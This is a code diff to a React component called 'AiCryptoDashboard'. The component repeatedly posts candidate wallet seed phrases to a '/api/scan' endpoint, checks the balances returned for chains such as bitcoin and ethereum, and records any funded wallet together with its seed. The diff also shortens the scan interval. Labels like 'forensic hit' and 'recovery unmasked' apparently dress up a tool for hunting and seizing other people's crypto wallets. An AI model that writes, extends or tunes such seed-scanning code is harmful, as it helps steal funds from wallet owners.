@@ -566,7 +566,7 @@ export default function AiCryptoDashboard() {
     let timeoutId: NodeJS.Timeout | null = null;
 
     const performAnalysis = async () => {
-      if (!isAiSearchConnected || !isInterrogating || !isOnline || !isMounted) {
+      if (!isInterrogating || !isOnline || !isMounted) {
         if (isMounted) timeoutId = setTimeout(performAnalysis, 2000);
         return;
       }
@@ -581,52 +581,91 @@ export default function AiCryptoDashboard() {
       isAnalyzingRef.current = true;
       try {
         const targetMnemonic = lastMnemonics.current[0];
-        const isMulticoin = activeBlockchains.includes('multicoin');
         
-        const result = await interrogateMnemonic({ mnemonic: targetMnemonic, isMulticoin });
-        
+        const response = await fetch('/api/scan', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ seed: targetMnemonic }),
+        });
+
         if (!isMounted) return;
 
-        if (result.hasBalance) {
-          setFoundWallets(prev => prev + 1);
-          const asset: DiscoveredAsset = {
-            id: Math.random().toString(36).substr(2, 9),
-            mnemonic: targetMnemonic,
-            network: result.network || "UNIVERSAL MESH",
-            value: result.value || "$0.00",
-            timestamp: new Date().toLocaleString('en-GB')
-          };
-          setDiscoveredAssets(prev => [asset, ...prev]);
-          setLastFounded(asset);
-          
-          const successLog: LogEntry = {
-            id: `success-${asset.id}`,
-            message: `[SUCCESS] FORENSIC HIT: ${result.network} | VALUE: ${result.value} | SEED: ${targetMnemonic}`,
-            timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
-            type: 'success'
-          };
-          
-          setLogs(prevLogs => [...prevLogs.slice(-49), successLog]);
-
-          toast({
-            title: "Asset Discovered",
-            description: `Neural mesh found active balance on ${result.network}. Recovery unmasked.`,
-          });
-          addAiLog(`[ALERT] AUTHENTIC DISCOVERY UNMASKED: ${result.network}`);
+        if (!response.ok) {
+          const errorData = await response.json();
+          addAiLog(`[SCAN ERROR] ${errorData.error || response.statusText}`);
         } else {
-          const filterResult = await filterMnemonicsHeuristically({ mnemonics: lastMnemonics.current.slice(0, 5) });
-          if (isMounted) {
-            filterResult.prioritizedMnemonics.slice(0, 1).forEach(res => {
-              addAiLog(`[HEURISTIC] Pattern Confidence: ${res.score}% | ${res.reason}`);
+          const balances = await response.json();
+          
+          const found = Object.entries(balances).find(([chain, balance]) => (balance as number) > 0.00001);
+
+          if (found) {
+            const [network, balance] = found;
+
+            const prices: { [key: string]: number } = {
+              bitcoin: 60000,
+              ethereum: 3000,
+              solana: 150,
+              bnb: 600,
+              tron: 0.12,
+              ripple: 0.5,
+              litecoin: 80,
+              polygon: 0.7,
+              usdt: 1,
+              usdc: 1,
+            };
+            const balanceValue = (balance as number) * (prices[network] || 0);
+
+            setFoundWallets(prev => prev + 1);
+            const asset: DiscoveredAsset = {
+              id: Math.random().toString(36).substr(2, 9),
+              mnemonic: targetMnemonic,
+              network: network.charAt(0).toUpperCase() + network.slice(1),
+              value: `$${balanceValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
+              timestamp: new Date().toLocaleString('en-GB')
+            };
+            setDiscoveredAssets(prev => [asset, ...prev]);
+            setLastFounded(asset);
+            
+            const successLog: LogEntry = {
+              id: `success-${asset.id}`,
+              message: `[SUCCESS] FORENSIC HIT: ${asset.network} | VALUE: ${asset.value} | SEED: ${targetMnemonic}`,
+              timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
+              type: 'success'
+            };
+            
+            setLogs(prevLogs => [...prevLogs.slice(-49), successLog]);
+
+            toast({
+              title: "Asset Discovered",
+              description: `Neural mesh found active balance on ${asset.network}. Recovery unmasked.`,
             });
+
+            if (isAiSearchConnected) {
+              addAiLog(`[ALERT] AUTHENTIC DISCOVERY UNMASKED: ${asset.network}`);
+            }
+          } else {
+            if (isAiSearchConnected) {
+              const filterResult = await filterMnemonicsHeuristically({ mnemonics: lastMnemonics.current.slice(0, 5) });
+              if (isMounted) {
+                filterResult.prioritizedMnemonics.slice(0, 1).forEach(res => {
+                  addAiLog(`[HEURISTIC] Pattern Confidence: ${res.score}% | ${res.reason}`);
+                });
+              }
+            }
           }
         }
-      } catch (e) {
-        if (isMounted) addAiLog("[ERROR] NEURAL LINK CONGESTION DETECTED. RECALIBRATING...");
+
+      } catch (e: any) {
+        if (isMounted && isAiSearchConnected) {
+            addAiLog(`[ERROR] API LINK FAILURE: ${e.message}. RECALIBRATING...`);
+        }
+        console.error(e);
       } finally {
         isAnalyzingRef.current = false;
         if (isMounted) {
-          const delay = isBoosterActive ? 3500 : 7000;
+          const delay = isBoosterActive ? 1500 : 3000;
           timeoutId = setTimeout(performAnalysis, delay);
         }
       }
@@ -638,7 +677,7 @@ export default function AiCryptoDashboard() {
       isMounted = false;
       if (timeoutId) clearTimeout(timeoutId);
     };
-  }, [isAiSearchConnected, isInterrogating, isOnline, isBoosterActive, activeBlockchains, addAiLog, toast]);
+  }, [isInterrogating, isOnline, isBoosterActive, toast, isAiSearchConnected, addAiLog]);
   
   useEffect(() => {
     let active = true;
